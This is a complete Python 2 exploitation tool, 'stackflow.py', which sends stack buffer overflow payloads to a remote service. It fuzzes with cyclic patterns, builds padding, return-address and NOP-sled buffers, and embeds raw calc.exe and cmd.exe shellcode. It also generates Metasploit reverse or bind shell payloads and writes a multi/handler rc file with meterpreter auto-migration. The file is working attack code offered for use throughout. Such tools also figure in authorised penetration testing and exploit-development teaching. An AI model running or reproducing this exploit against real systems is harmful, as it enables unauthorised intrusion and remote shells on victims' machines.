#!/usr/bin/python
#
# Stackflow.py - Universal stack-based buffer overflow exploitation tool
#  by @d4rkcat github.com/d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from socket import socket, SOCK_STREAM, AF_INET
from os import system
from argparse import ArgumentParser
from re import findall

parser = ArgumentParser(prog='stackflow', usage='./stackflow.py OPTIONS')
parser.add_argument('-r', "--rhost", type=str, help='rhost')
parser.add_argument('-p', "--rport", type=str, help='rport')
parser.add_argument('-c', "--cmds", type=str, help='commands to send to server before overflow')
parser.add_argument('-v', "--vulncmd", type=str, help='vulnerable command')
parser.add_argument('-o', "--offset", type=int, help='offset to EIP')
parser.add_argument('-a', "--returnadd", type=str, help='return address')
parser.add_argument('-n', "--nops", type=int, help='number of NOPS \\x90 to prepend')
parser.add_argument('-m', "--payload", type=str, help='MSF payload')
parser.add_argument('-i', "--lhost", type=str, help='lhost')
parser.add_argument('-l', "--lport", type=str, help='lport')
parser.add_argument('-f', "--fuzz", type=str, help='Fuzz command with cyclic pattern')
parser.add_argument('-t', "--calc", action="store_true", help='Send calc.exe shellcode')
parser.add_argument('-t1', "--cmdprompt", action="store_true", help='Send cmd.exe shellcode')
parser.add_argument('-d', "--display", action="store_true", help='Display the exploit buffer')
parser.add_argument('-w', "--timeout", type=int, help='Timeout for socket (Default: 5)')
parser.add_argument('-e', "--cfexport", type=str, help='Export exploit config and handler rc file')
parser.add_argument('-g', "--cfimport", type=str, help='Import exploit config from file')
args = parser.parse_args()

def banner():
	print '''                                                   MMMMMMMMMM                    
                                               MMMMMMMMMMMMMMMM                 
                                             MMMMMMMMMMMMMMMMMMMM               
                                            MMMMMMM       MMMMMMMM              
                                           MMMMMM           MMMMMMM             
                                          MMMMM               MMMMMM            
                                          MMMM                MMMMMM            
                                          MMMM                 MMMMMM           
                                         MMMMM                 MMMMMM           
                                         MMMM                  MMMMMMM          
                                         MMMM                  MMMMMMM          
                                         MMMM                  MMMMMMMM         
                                         MMMM                 MMMMMMMMMM        
                                         MMMM               MMMMMMMMMMMMMM      
                                         MMMM              MMMMMMMMMMMMMMMM     
                                         .MMM            MMMMMMMMMMMMMMMMMMM.   
                                          MMM           MMMMMMMMMMMMMMMMMMMMM   
                                           M           MMMMMMMMMMMMMMMMMMMMMMM  
                                                      MMMMMMMMMMMMMMMMMMMMMMMM  
                                                     MMMMMMMMMMMMMMMMMMMMMMMMMM 
                                                     MMMMMMMMMMMMMMMMMMMMMMMMMM 
                                                    MMMMMMMMMMMMMMMMMMMMMMMMMMM 
                                                   MMMMMMMMMMMMMMMMMMMMMMMMMMMM 
                   M                             MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 
                   MM                           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM 
                   MMM      M                 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                  MMMMM MMMMMM  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMM 
        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMM 
         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM     MMMMM  
          :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      MMMMM  
           MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      MMMMM  
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM7      MMMMM  
                     MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      MMMMM   
                      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      MMMMM   
                    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMM     MMMMMMM   
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    MMMM     MMMMMMM    
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM               MMMMMM     
       .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                             
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                           
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM                                             
MMMMMMMM MMMMMMMMMMMMMMMMMMMMM                                                  
 .MMM   MMMMMMMMMMMMMMM                                                         
       MMMMMMMMMMM                                                              
        MMMMMMM                       stackflow.py   
        				  by d4rkcat                                                                                                                                                      

                '''

def configimport(configfile):		#Import exploit config
	global args
	if configfile.endswith('.py'):
		configfile = configfile[:-3]
	cf = configfile
	try:
		print ' [*] Loading ' + cf + '.py config file\n'
		args = __import__(cf)
		args.cfexport = None
	except:
		print ' [*] Config file ' + cf + '.py not found!\n'
		exit()

def configexport(configfile):		#Export exploit config and rc file
	print '\n [*] Preparing exploit for export.'
	cf = open(configfile + '.py', 'w')
	if not fuzz and not calc:
		generate(payload)
		p = open('/tmp/shlcde', 'r')
		sc = p.read()
		p.close()
		cf.write("shellcode='" + sc + "'\n")
		rc = open(configfile + '.rc', 'w')
		rc.write('use exploit/multi/handler\nset PAYLOAD ' + payload + '\n')
		if findall('bind', payload):
			rc.write('set RHOST ' + rhost + '\n')
			when = 'after'
		else:
			rc.write('set LHOST ' + lhost + '\n')
			when = 'before'
		rc.write('set LPORT ' + lport + '\n')
		if findall('meterpreter', payload) and findall('windows', payload):
			rc.write('set ExitOnSession false\nset AutoRunScript post/windows/manage/migrate\n')
		rc.write('exploit -j\n')
		rc.close()
		print '\n [*] Metasploit handler rc file written to ' + configfile + '.rc\n [>] Run ' + when + ' sending the buffer with: msfconsole -r ' + configfile + '.rc\n'

	if fuzz:
		generate('fuzz')
		p = open('/tmp/fuzz', 'r')
		pat = p.read()
		p.close()
		cf.write("pattern='" + pat.strip('\n') + "'\n")

	conf = str(args).replace('Namespace', '').strip('(').strip(')').split(',')
	for var in conf:
		if not var.startswith('cf'):
			cf.write(var.strip() + '\n')
	cf.close()
	
	print ' [*] Exploit config exported to ' + configfile + '.py\n'

def generate(payload):		#Generate metasploit shellcode
	if fuzz:
		print "\n [*] Generating cyclic pattern..\n"
		system('$(locate pattern_create.rb | grep work/tools | head -n 1) ' + fuzz + ' > /tmp/fuzz')
	else:
		print " [*] Generating " + payload + " shellcode.\n"
		if findall('bind', payload):
			#cmd = str('$(which msfvenom) -p ' + payload + ''' -e x86/shikata_ga_nai -i 2 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -f py LPORT=''' + lport + ''' | tail -n +2 | cut -c 8- | tr -d '\n' | tr -d '"' > /tmp/shlcde''')
			cmd = str('$(which msfpayload) ' + payload + " LPORT='" + lport + "' R | $(which msfencode) -a x86 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -c 2 -t py | tail -n +2 | cut -c 8- | tr -d '\n' |" + ''' tr -d '"' > /tmp/shlcde''')
		else:
			#cmd = str('$(which msfvenom) -p ' + payload + ''' -e x86/shikata_ga_nai -i 2 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -f py LHOST=''' + lhost + ' LPORT=' + lport + ''' | tail -n +2 | cut -c 8- | tr -d '\n' | tr -d '"' > /tmp/shlcde''')
			cmd = str('$(which msfpayload) ' + payload + " LHOST='" + lhost + "' LPORT='" + lport + "' R | $(which msfencode) -a x86 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -c 2 -t py | tail -n +2 | cut -c 8- | tr -d '\n' |" + ''' tr -d '"' > /tmp/shlcde''')
		system(cmd)

def flipbytes(returnadd):
	returnadd = '\\x' + returnadd[6:8] + '\\x' + returnadd[4:6] + '\\x' + returnadd[2:4] + '\\x' + returnadd[0:2]
	return returnadd.decode('string_escape')

def fexit():
	banner()
	parser.print_help()
	exit()

def communicate(rhost,rport,payload,buflen,lhost,lport):		#Communicate with the server
	es = socket(AF_INET, SOCK_STREAM)
	es.settimeout(timeout)
	print ' [>] Attempting to connect to ' + rhost + ' on port ' + rport + '..' 
	try:
		es.connect((rhost, int(rport)))
		print ' [<] ' + es.recv(2048)
		print " [^] Connection established.\n"
	except:
		print "\n [X] Could not connect to " + rhost + " on port " + rport
		exit()

	if args.cmds:
		cmds = args.cmds.strip('\n').split('&')
		for cmd in cmds:
			es.send(cmd + '\r\n')
			try:
				print ' [>] ' + cmd
				print ' [<] ' + es.recv(2048)
			except:
				pass

	if vulncmd:
		buf = vulncmd + ' '
	else:
		buf = ''

	if fuzz:
		try:
			if args.pattern:
				buf += args.pattern
		except:
			generate('fuzz')
			p = open('/tmp/fuzz', 'r')
			buf += p.read()
			p.close()
	else:
		a, b = divmod(buflen, len('Pwn3D!'))
		buf += 'Pwn3D!' * a + 'Pwn3D!'[:b]
		buf += returnadd
		buf += "\x90" * 4 * nops

		if calc:
			print " [*] Using calc.exe shellcode."
			buf += ("\xbf\xc2\x51\xc1\x05\xda\xd4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x33\x83\xea\xfc\x31\x7a\x0e\x03\xb8\x5f\x23\xf0\xc0\x88\x2a\xfb"
			"\x38\x49\x4d\x75\xdd\x78\x5f\xe1\x96\x29\x6f\x61\xfa\xc1\x04\x27\xee\x52\x68\xe0\x01\xd2\xc7\xd6\x2c\xe3\xe9\xd6\xe2\x27\x6b"
			"\xab\xf8\x7b\x4b\x92\x33\x8e\x8a\xd3\x29\x61\xde\x8c\x26\xd0\xcf\xb9\x7a\xe9\xee\x6d\xf1\x51\x89\x08\xc5\x26\x23\x12\x15\x96"
			"\x38\x5c\x8d\x9c\x67\x7d\xac\x71\x74\x41\xe7\xfe\x4f\x31\xf6\xd6\x81\xba\xc9\x16\x4d\x85\xe6\x9a\x8f\xc1\xc0\x44\xfa\x39\x33"
			"\xf8\xfd\xf9\x4e\x26\x8b\x1f\xe8\xad\x2b\xc4\x09\x61\xad\x8f\x05\xce\xb9\xc8\x09\xd1\x6e\x63\x35\x5a\x91\xa4\xbc\x18\xb6\x60"
			"\xe5\xfb\xd7\x31\x43\xad\xe8\x22\x2b\x12\x4d\x28\xd9\x47\xf7\x73\xb7\x96\x75\x0e\xfe\x99\x85\x11\x50\xf2\xb4\x9a\x3f\x85\x48"
			"\x49\x04\x79\x03\xd0\x2c\x12\xca\x80\x6d\x7f\xed\x7e\xb1\x86\x6e\x8b\x49\x7d\x6e\xfe\x4c\x39\x28\x12\x3c\x52\xdd\x14\x93\x53"
			"\xf4\x76\x72\xc0\x94\x56\x11\x60\x3e\xa7")

		elif cmdprompt:
			print " [*] Using cmd.exe shellcode."
			buf += ("\x6a\x3e\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa0\x6a\xbe\x98\x83\xeb\xfc\xe2\xf4\xca\x52\xe7\x41\x4e\xb3\xca\xbc\x54"
			"\x31\x3f\xeb\xb3\xe1\x66\xdc\x43\xe9\x55\x64\x42\x9e\x5f\x72\xbd\x50\xdb\x99\x90\xad\xc1\x1b\x65\xfa\x26\xc8\x3e\x34\x86\xc3"
			"\x0f\x75\xd7\xb4\x90\xbb\x01\xf3\x6c\x53\xe8\x7a\x89\x62\x5a\x97\xe7\x01\xb8\x78\x3e\x5f\x03\xa1\x78\xd8\xfa\xdb\x63\xe4\xc2"
			"\xd5\x5d\xac\xb9\x33\xc0\x6f\xe9\x8f\x6e\x7f\xa8\x32\xa3\x5e\x89\x34\x8e\xa3\xda\xa4\xe7\x01\x98\x78\x2e\x6f\x89\x23\xe7\x13"
			"\xf0\x76\xac\x27\xc2\xf2\xbc\x03\x03\xbb\x74\xd8\xd0\xd3\x6d\x80\x6b\xcf\x25\xd8\xbc\x78\x6d\x85\xb9\x0c\x5d\x93\x24\x32\xa3"
			"\x5e\x89\x34\x54\xb3\xfd\x07\x6f\x2e\x70\xc8\x11\x77\xfd\x11\x34\xd8\xd0\xd7\x6d\x80\xee\x78\x60\x18\x03\xab\x70\x52\x5b\x78"
			"\x68\xd8\x89\x23\xe5\x17\xac\xd7\x37\x08\xe9\xaa\x36\x02\x77\x13\x34\x0c\xd2\x78\x7e\xb8\x0e\xae\x06\x52\x05\x76\xd5\x53\x88"
			"\xf3\x3c\x3b\xb9\x78\x03\xd4\x77\x26\xd7\xa3\x3d\x51\x3a\x3b\x2e\x66\xd1\xce\x77\x26\x50\x55\xf4\xf9\xec\xa8\x68\x86\x69\xe8"
			"\xcf\xe0\x1e\x3c\xe2\xf3\x3f\xac\x5d\x90\x01\x37\xa6\x96\x14\x36\x88\xf3\xe4\x89\xbe\x98")
		else:
			try:
				if args.shellcode:
					buf += args.shellcode
			except:
				generate(payload)
				p = open('/tmp/shlcde', 'r')
				buf += str(p.read().decode('string_escape'))
				p.close()				
	
	buf += "\r\n"

	if display:
		print '\n [*] Exploit Buffer: \n' + str(buf)
	try:
		es.send(buf)
		if not fuzz and not calc and not cmdprompt:
			print '\n [$] Buffer sent, evil metasploit shellcode should be running..'
			if findall('bind', payload):
				print '\n [$] Payload ' + payload + ' should be listening on port ' + lport + '\n'
			else:
				print '\n [$] Payload ' + payload + ' should be connecting back to ' + lhost + ' on port ' + lport + '\n'
		elif calc:
			print '\n [$] calc.exe should be running, enjoy your calculations..\n'
		elif cmdprompt:
			print '\n [$] cmd.exe should be running, enjoy your session..\n'
		else:
			print ' [Z] Cyclic pattern fuzzing buffer of ' + fuzz + ' length sent.'
	except:
 		pass

 	es.settimeout(0.5)
 	try:
		es.recv(2048)
	except:
		pass
	es.close()

if args.cfimport:
	configimport(args.cfimport)

lhost = args.lhost
lport = args.lport
rhost = args.rhost
rport = args.rport
payload = args.payload
buflen = args.offset
fuzz = args.fuzz
calc = args.calc
cmdprompt = args.cmdprompt
display = args.display
vulncmd = args.vulncmd
returnadd = args.returnadd

if args.timeout:
	timeout = args.timeout
else:
	timeout = 5

if args.nops:
	nops = args.nops
else:
	nops = 3

if not fuzz and not calc and not cmdprompt:
	if not buflen or not lport or not payload or not returnadd or not buflen:
		fexit()

if not rhost or not rport:
	print ' [*] You must specify the remote host and remote port!\n'
	fexit()

if returnadd:
	returnadd = flipbytes(returnadd)

if args.cfexport:
	configexport(args.cfexport)

else:
	communicate(rhost,rport,payload,buflen,lhost,lport)